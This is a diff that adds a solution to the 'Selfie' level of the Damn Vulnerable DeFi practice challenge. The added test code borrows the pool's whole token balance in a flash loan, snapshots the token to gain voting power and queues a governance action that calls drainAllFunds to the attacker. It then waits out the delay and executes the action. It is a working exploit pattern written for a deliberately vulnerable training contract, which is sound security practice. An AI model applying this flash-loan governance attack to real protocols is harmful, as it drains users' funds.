@@ -18,6 +18,8 @@ contract Selfie is Test {
     DamnValuableTokenSnapshot internal dvtSnapshot;
     address payable internal attacker;
 
+    uint256 private val;
+
     function setUp() public {
         utils = new Utilities();
         address payable[] memory users = utils.createUsers(1);
@@ -43,10 +45,35 @@ contract Selfie is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    function executeHack() external payable {
+    }
+
+    function receiveTokens(address token, uint256 borrowAmount) external payable {
+        dvtSnapshot.snapshot();
+      // after receiving tokens, queue governance action
+      val = simpleGovernance.queueAction(
+        address(selfiePool),
+        abi.encodeWithSignature("drainAllFunds(address)", attacker),
+        0
+      );
+
+      // return money to pool
+      DamnValuableTokenSnapshot(token).transfer(msg.sender, borrowAmount);
+
+    }
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
+
+        
+        selfiePool.flashLoan(dvtSnapshot.balanceOf(address(selfiePool)));
+
+        // wait for governance time to elapse
+        vm.warp(block.timestamp + 2 days);
+
+        simpleGovernance.executeAction(val);
 
         /**
          * EXPLOIT END *
